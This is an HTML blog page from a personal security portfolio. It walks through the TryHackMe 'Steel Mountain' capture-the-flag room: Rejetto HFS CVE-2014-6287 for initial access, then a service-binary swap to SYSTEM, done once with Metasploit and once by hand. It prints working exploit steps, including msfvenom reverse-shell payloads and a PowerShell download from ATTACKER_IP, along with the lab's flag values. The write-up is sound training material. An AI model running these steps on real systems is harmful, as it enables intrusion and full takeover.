@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Steel Mountain | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: Rejetto HFS CVE-2014-6287 for initial access, AdvancedSystemCareService9 unquoted service path privesc to SYSTEM, done twice with Metasploit and entirely by hand.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/steel-mountain.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/steel-mountain.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Steel Mountain">
+<meta property="og:description" content="TryHackMe CTF: Rejetto HFS CVE-2014-6287 for initial access, AdvancedSystemCareService9 unquoted service path privesc to SYSTEM, done twice with Metasploit and entirely by hand.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Steel Mountain">
+<meta name="twitter:description" content="TryHackMe CTF: Rejetto HFS CVE-2014-6287 for initial access, AdvancedSystemCareService9 unquoted service path privesc to SYSTEM, done twice with Metasploit and entirely by hand.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Steel Mountain</h1>
+    <div class="post-description">TryHackMe CTF. A Mr. Robot themed Windows box. Rejetto HFS RCE for initial access, unquoted service path privesc to SYSTEM. Then the whole thing again without Metasploit.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>A Mr. Robot themed Windows box. Initial access with Metasploit, then privesc to Administrator. Then we do the whole thing again without the training wheels.</p>
+
+<p>The machine doesn&rsquo;t respond to ping and takes a few minutes to boot.</p>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-01 at 9.49.58 PM.png" alt="Steel Mountain homepage showing Bill Harper as Employee of the Month" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Employee of the month:</strong> Bill Harper. Remember Bill. We&rsquo;re going to ruin his month.</p>
+
+<hr>
+
+<h2>Initial recon</h2>
+
+<p>Port 80 is the obvious one. Let&rsquo;s find the rest.</p>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-01 at 9.53.38 PM.png" alt="nmap vuln scan results showing open ports on the Windows target" style="max-width:100%;margin:2rem 0;">
+
+<p>A second full-port pass to catch anything the first missed:</p>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV -p- -T4 -A TARGET_IP</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-01 at 10.10.29 PM.png" alt="full-port nmap scan confirming port 8080 open" style="max-width:100%;margin:2rem 0;">
+
+<p>The other web server is on <strong>8080</strong>.</p>
+
+<p>View source on <code>:8080</code>:</p>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-01 at 10.19.47 PM.png" alt="port 8080 page source revealing Rejetto HTTP File Server" style="max-width:100%;margin:2rem 0;">
+
+<p>It took some digging and a small logic puzzle, but the file server running here is <strong>Rejetto HTTP File Server</strong>.</p>
+
+<hr>
+
+<h2>Finding the CVE</h2>
+
+<p>I&rsquo;d normally reach for searchsploit, but Metasploit is doing the heavy lifting next, so:</p>
+
+<pre><code class="language-bash">msfconsole
+search rejetto</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-01 at 10.27.58 PM.png" alt="Metasploit search rejetto returning available modules" style="max-width:100%;margin:2rem 0;">
+
+<p>The 2025 CVE didn&rsquo;t fit the constraints, so I went to NIST for the 2014 one. I trust NIST, and was right to.</p>
+
+<p><strong>CVE: 2014-6287</strong></p>
+
+<hr>
+
+<h2>Initial shell via Metasploit</h2>
+
+<pre><code class="language-bash">use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS TARGET_IP
+set LHOST ATTACKER_IP
+set RPORT 8080
+show options
+run</code></pre>
+
+<p>I hit this error twice:</p>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 6.17.05 AM.png" alt="Metasploit error showing local port 8080 conflict with SRVPORT" style="max-width:100%;margin:2rem 0;">
+
+<p>Metasploit was trying to both attack the target on 8080 and host its own callback server on 8080 locally. My local 8080 was already occupied. Easy fix, move the stager to 8081:</p>
+
+<pre><code class="language-bash">set SRVPORT 8081
+run</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 6.22.54 AM.png" alt="Metasploit exploit running successfully and opening a meterpreter session" style="max-width:100%;margin:2rem 0;">
+
+<p>Once you land in meterpreter:</p>
+
+<pre><code>meterpreter > shell
+cd C:\Users\bill\Desktop
+more user.txt</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 6.25.38 AM.png" alt="user.txt flag on Bill's desktop" style="max-width:100%;margin:2rem 0;">
+
+<p>User flag: <code>b04763b6fcf51fcd7c13abc7db4fd365</code></p>
+
+<hr>
+
+<h2>Privesc with PowerUp</h2>
+
+<p>Now we enumerate for misconfigurations. We&rsquo;ll use PowerUp, a PowerShell script that hunts common Windows privesc vectors.</p>
+
+<p>Upload it through meterpreter:</p>
+
+<pre><code>meterpreter > upload /home/jenn/Downloads/PowerUp.ps1
+meterpreter > load powershell
+meterpreter > powershell_shell
+PS > . .\PowerUp.ps1
+PS > Invoke-AllChecks</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 6.46.01 AM.png" alt="PowerUp Invoke-AllChecks output flagging a service with CanRestart true" style="max-width:100%;margin:2rem 0;">
+
+<p>PowerUp flags a service with <code>CanRestart</code> set to true, which means we can restart it ourselves.</p>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 6.47.02 AM.png" alt="PowerUp output naming AdvancedSystemCareService9 as the vulnerable unquoted service path" style="max-width:100%;margin:2rem 0;">
+
+<p>The vulnerable service is <strong>AdvancedSystemCareService9</strong>, an unquoted service path. The application&rsquo;s directory is writable, so we can swap the legitimate binary for a malicious one.</p>
+
+<p>Generate a reverse shell as a service executable:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe</code></pre>
+
+<p>Upload it, stop the service, drop our binary in place, start a listener, restart the service.</p>
+
+<pre><code>upload Advanced.exe
+meterpreter > shell
+sc stop AdvancedSystemCareService9
+copy Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\Advanced.exe"</code></pre>
+
+<p>Listener on the attacker box:</p>
+
+<pre><code class="language-bash">nc -nlvp 4443</code></pre>
+
+<p>Restart the service to trigger our binary as SYSTEM:</p>
+
+<pre><code>sc start AdvancedSystemCareService9</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 7.42.05 AM.png" alt="listener catching the SYSTEM shell after service restart" style="max-width:100%;margin:2rem 0;">
+
+<p>As soon as the listener pops:</p>
+
+<pre><code>cd C:\Users\Administrator\Desktop
+more root.txt</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 7.44.03 AM.png" alt="root.txt flag on Administrator desktop" style="max-width:100%;margin:2rem 0;">
+
+<p>Root flag: <code>9af5f314f57607c00fd09803a587db80</code></p>
+
+<hr>
+
+<h2>Now without Metasploit</h2>
+
+<p>Same box, no training wheels. This is the part that matters.</p>
+
+<p>Grab the manual exploit from ExploitDB (39161):</p>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 8.00.02 AM.png" alt="ExploitDB page for exploit 39161, Rejetto HFS remote command execution" style="max-width:100%;margin:2rem 0;">
+
+<p>Confirm you have an nc.exe binary to serve:</p>
+
+<pre><code class="language-bash">locate nc.exe</code></pre>
+
+<p>Drop the exploit into a file, set your IP and port, and adjust the VBS line:</p>
+
+<pre><code class="language-bash">nano rejetto_goblin.py</code></pre>
+
+<p>The script is Python2. If it throws errors, convert it:</p>
+
+<pre><code class="language-bash">python3 -m lib2to3 -w rejetto_goblin.py</code></pre>
+
+<p>Three windows on the attacker box: a Python web server, a listener, and the exploit.</p>
+
+<pre><code class="language-bash">sudo python3 -m http.server 80     # window 1
+nc -nlvp 4444                       # window 2
+python3 rejetto_goblin.py TARGET_IP 8080   # window 3</code></pre>
+
+<p>Run the exploit once to stage, then again to fire.</p>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 8.36.54 AM.png" alt="manual exploit firing and landing a shell as bill" style="max-width:100%;margin:2rem 0;">
+
+<p>And Bill is pwned again, this time by hand.</p>
+
+<hr>
+
+<h2>Manual privesc with winPEAS</h2>
+
+<p>Stage winPEAS:</p>
+
+<pre><code class="language-bash">cp /usr/share/peass/winpeas/winPEASx64.exe ~/winPEAS.exe</code></pre>
+
+<p>Pull it onto Bill&rsquo;s box and run it. The critical line:</p>
+
+<pre><code>AdvancedSystemCareService9 ... ASCService.exe ... Auto - Stopped
+File Permissions: bill [Allow: WriteData/CreateFiles]</code></pre>
+
+<p>Bill can overwrite the service binary, and the service runs as LocalSystem. Same vulnerability, found by hand.</p>
+
+<p>Build the replacement binary:</p>
+
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe -o ASCService.exe</code></pre>
+
+<p>Download it onto Bill&rsquo;s box:</p>
+
+<pre><code class="language-powershell">powershell -c wget "http://ATTACKER_IP/ASCService.exe" -outfile "ASCService.exe"</code></pre>
+
+<p>New listener:</p>
+
+<pre><code class="language-bash">nc -nlvp 4445</code></pre>
+
+<p>Stop the service, swap the binary, start it again:</p>
+
+<pre><code class="language-powershell">sc stop AdvancedSystemCareService9
+copy /Y ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+sc start AdvancedSystemCareService9</code></pre>
+
+<img src="/images/steel-mountain/Screenshot 2026-06-02 at 9.39.12 AM.png" alt="SYSTEM shell via manual winPEAS-discovered service swap, no Metasploit" style="max-width:100%;margin:2rem 0;">
+
+<p>Score again. SYSTEM shell, no Metasploit anywhere in the chain.</p>
+
+<p>The PowerShell one-liner to find the service name by hand, for the record:</p>
+
+<pre><code class="language-powershell">powershell -c "Get-Service"</code></pre>
+
+<p>Two roads to the same SYSTEM shell. The framework is faster. Doing it by hand is how you actually learn what the framework was doing for you.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+nmap -sS -Pn -sC -sV -p- -T4 -A TARGET_IP
+# Port 80 and 8080 (web). 8080 = Rejetto HTTP File Server.
+
+# 2. Identify CVE-2014-6287 (Rejetto HFS RCE)
+
+# --- PATH A: Metasploit ---
+# 3. Initial shell
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS TARGET_IP
+set LHOST ATTACKER_IP
+set RPORT 8080
+set SRVPORT 8081        # avoid local 8080 conflict
+run                     # meterpreter -> user.txt
+
+# 4. Privesc: PowerUp finds AdvancedSystemCareService9 (unquoted path, writable, CanRestart)
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+# upload, sc stop, copy into service dir, nc -nlvp 4443, sc start -> SYSTEM -> root.txt
+
+# --- PATH B: no Metasploit ---
+# 5. Manual exploit (ExploitDB 39161, Python2 -> 2to3)
+sudo python3 -m http.server 80
+nc -nlvp 4444
+python3 rejetto_goblin.py TARGET_IP 8080   # run twice
+
+# 6. winPEAS confirms same service misconfig by hand
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe -o ASCService.exe
+# wget onto target, nc -nlvp 4445
+sc stop AdvancedSystemCareService9
+copy /Y ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+sc start AdvancedSystemCareService9        # SYSTEM</code></pre>
+
+<p>Recap: Rejetto HFS (CVE-2014-6287) for initial access, AdvancedSystemCareService9 unquoted service path for privesc to SYSTEM. Done twice, with Metasploit and entirely by hand.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
